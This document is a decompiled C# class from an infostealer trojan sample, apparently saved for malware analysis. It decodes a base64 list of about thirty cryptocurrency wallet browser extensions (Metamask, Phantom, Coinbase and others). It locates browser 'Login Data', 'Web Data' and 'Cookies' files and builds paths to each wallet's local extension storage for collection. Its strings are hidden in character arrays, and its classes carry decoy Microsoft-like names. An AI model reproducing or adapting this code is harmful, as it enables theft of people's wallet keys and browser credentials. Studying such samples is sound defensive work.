// Decompiled with JetBrains decompiler
// Type: MicrosoftSqlServerServerSmiContextY
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

public class MicrosoftSqlServerServerSmiContextY : MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd
{
  private List<string> Locals;
  private IEnumerable<KeyValuePair<string, string>> PathsCollection;

  public void Init(IList<string> browserPaths)
  {
    this.Locals = new List<string>((IEnumerable<string>) (browserPaths ?? (IList<string>) new List<string>()));
    char[] charArray = "ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbgpiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYXxQaGFudG9tCmZoaWxhaGVpbWdsaWduZGRramdvZmtjYmdla2hlbmJofE94eWdlbgptZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbnxQYWxpV2FsbGV0CmFvZGtrYWduYWRjYm9iZnBnZ2ZuamVvbmdlbWpiamNhfEJvbHRYCmtwZm9wa2VsbWFwY29pcGVtZmVuZG1kY2dobmVnaW1ufExpcXVhbGl0eVdhbGxldApobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZnxYZGVmaVdhbGxldApscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkb3xOYW1pV2FsbGV0CmRuZ21sYmxjb2Rmb2JwZHBlY2FhZGdmYmNnZ2ZqZm5tfE1haWFyRGVGaVdhbGxldApmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYnxZb3JvaVdhbGxldAppYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlY3xUcm9ubGluawpqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZHxOaWZ0eVdhbGxldApua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubnxNZXRhbWFzawphZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsY3xNYXRoV2FsbGV0CmhuZmFua25vY2Zlb2ZiZGRnY2lqbm1obmZua2RuYWFkfENvaW5iYXNlCmZoYm9oaW1hZWxib2hwamJibGRjbmdjbmFwbmRvZGpwfEJpbmFuY2VDaGFpbgpvZGJmcGVlaWhka2JpaG1vcGtiam1vb25mYW5sYmZjbHxCcmF2ZVdhbGxldApocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbnxHdWFyZGFXYWxsZXQKYmxuaWVpaWZmYm9pbGxrbmpuZXBvZ2poa2dub2FwYWN8RXF1YWxXYWxsZXQKY2plbGZwbHBsZWJkamplbmxscGpjYmxtamtmY2ZmbmV8SmF4eHhMaWJlcnR5CmZpaGtha2ZvYmtta2pvanBjaHBmZ2NtaGZqbm1uZnBpfEJpdEFwcFdhbGxldAprbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmanxpV2FsbGV0CmFta21qam1tZmxkZG9nbWhwamxvaW1pcGJvZm5mamlofFdvbWJhdApmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaHxBdG9taWNXYWxsZXQKbmxibW5uaWpjbmxlZ2tqanBjZmpjbG1jZmdnZmVmZG18TWV3Q3gKbmFuam1ka25oa2luaWZua2dkY2dnY2ZuaGRhYW1tbWp8R3VpbGRXYWxsZXQKbmtkZGduY2RqZ2pmY2RkYW1mZ2NtZm5saGNjbmltaWd8U2F0dXJuV2FsbGV0CmZuamhta2hobWtiamtrYWJuZGNubm9nYWdvZ2JuZWVjfFJvbmluV2FsbGV0CmFpaWZibmJmb2JwbWVla2lwaGVlaWppbWRwbmxwZ3BwfFRlcnJhU3RhdGlvbgpmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYnxIYXJtb255V2FsbGV0CmFlYWNoa25tZWZwaGVwY2Npb25ib29oY2tvbm9lZW1nfENvaW45OFdhbGxldApjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxma3xUb25DcnlzdGFsCnBkYWRqa2ZrZ2NhZmdiY2VpbWNwYmthbG5mbmVwYm5rfEthcmRpYUNoYWluCmJmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhfFBoYW50b20KZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8T3h5Z2VuCm1nZmZrZmJpZGloanBvYW9tYWpsYmdjaGRkbGljZ3BufFBhbGlXYWxsZXQKYW9ka2thZ25hZGNib2JmcGdnZm5qZW9uZ2VtamJqY2F8Qm9sdFgKa3Bmb3BrZWxtYXBjb2lwZW1mZW5kbWRjZ2huZWdpbW58TGlxdWFsaXR5V2FsbGV0CmhtZW9ibmZuZmNtZGtkY21sYmxnYWdtZnBmYm9pZWFmfFhkZWZpV2FsbGV0CmxwZmNiamtuaWpwZWVpbGxpZm5raWtnbmNpa2dmaGRvfE5hbWlXYWxsZXQKZG5nbWxibGNvZGZvYnBkcGVjYWFkZ2ZiY2dnZmpmbm18TWFpYXJEZUZpV2FsbGV0CmJoZ2hvYW1hcGNkcGJvaHBoaWdvb29hZGRpbnBrYmFpfEF1dGhlbnRpY2F0b3IKb29ramxia2lpamluaHBtbmpmZmNvZmpvbmJmYmdhb2N8VGVtcGxlV2FsbGV0".ToCharArray();
    this.PathsCollection = ((IEnumerable<string>) Encoding.UTF8.GetString(Convert.FromBase64CharArray(charArray, 0, charArray.Length)).Split(new string[2]
    {
      "\n",
      Environment.NewLine
    }, StringSplitOptions.RemoveEmptyEntries)).Select<string, KeyValuePair<string, string>>((Func<string, KeyValuePair<string, string>>) (x => new KeyValuePair<string, string>(x.Split('|')[0], x.Split('|')[1])));
  }

  public override string Id2(SystemDataXSDSchemaNameTypeE scannerArg, FileInfo filePath) => scannerArg.Id5;

  public override IEnumerable<SystemDataXSDSchemaNameTypeE> Id3()
  {
    List<SystemDataXSDSchemaNameTypeE> xsdSchemaNameTypeEList = new List<SystemDataXSDSchemaNameTypeE>();
    try
    {
      List<string> stringList = new List<string>();
      foreach (string baseDirectory in this.Locals.Select<string, string>((Func<string, string>) (x => Environment.ExpandEnvironmentVariables(x))))
      {
        string[] strArray = new string[3]
        {
          new string(new char[10]
          {
            'L',
            'o',
            'g',
            'i',
            'n',
            ' ',
            'D',
            'a',
            't',
            'a'
          }),
          new string(new char[8]
          {
            'W',
            'e',
            'b',
            ' ',
            'D',
            'a',
            't',
            'a'
          }),
          new string(new char[7]{ 'C', 'o', 'o', 'k', 'i', 'e', 's' })
        };
        foreach (string path in SystemNetTimerThreadQueueC.FindPaths(baseDirectory, 1, 1, strArray))
        {
          try
          {
            string empty1 = string.Empty;
            string empty2 = string.Empty;
            string fullName = new FileInfo(path).Directory.FullName;
            string str1;
            if (fullName.Contains(new string(new char[15]
            {
              'O',
              'p',
              'e',
              'r',
              'a',
              ' ',
              'G',
              'X',
              ' ',
              'S',
              't',
              'a',
              'b',
              'l',
              'e'
            })))
              str1 = new string(new char[8]
              {
                'O',
                'p',
                'e',
                'r',
                'a',
                ' ',
                'G',
                'X'
              });
            else
              str1 = path.Contains(new string(new char[16]
              {
                'A',
                'p',
                'p',
                'D',
                'a',
                't',
                'a',
                '\\',
                'R',
                'o',
                'a',
                'm',
                'i',
                'n',
                'g',
                '\\'
              })) ? SystemNetTimerThreadQueueC.ChromeGetRoamingName(fullName) : SystemNetTimerThreadQueueC.ChromeGetLocalName(fullName);
            if (!string.IsNullOrEmpty(str1))
            {
              string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
              string name = SystemNetTimerThreadQueueC.ChromeGetName(fullName);
              if (!string.IsNullOrEmpty(name))
              {
                foreach (KeyValuePair<string, string> paths in this.PathsCollection)
                  xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
                  {
                    Id2 = new string(new char[1]{ '*' }),
                    Id5 = str2 + "_" + name + "_" + paths.Value,
                    Id3 = false,
                    Id1 = Path.Combine(fullName, new string(new char[24]
                    {
                      'L',
                      'o',
                      'c',
                      'a',
                      'l',
                      ' ',
                      'E',
                      'x',
                      't',
                      'e',
                      'n',
                      's',
                      'i',
                      'o',
                      'n',
                      ' ',
                      'S',
                      'e',
                      't',
                      't',
                      'i',
                      'n',
                      'g',
                      's'
                    }), paths.Key)
                  });
              }
            }
          }
          catch
          {
          }
        }
      }
    }
    catch
    {
    }
    return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
  }
}
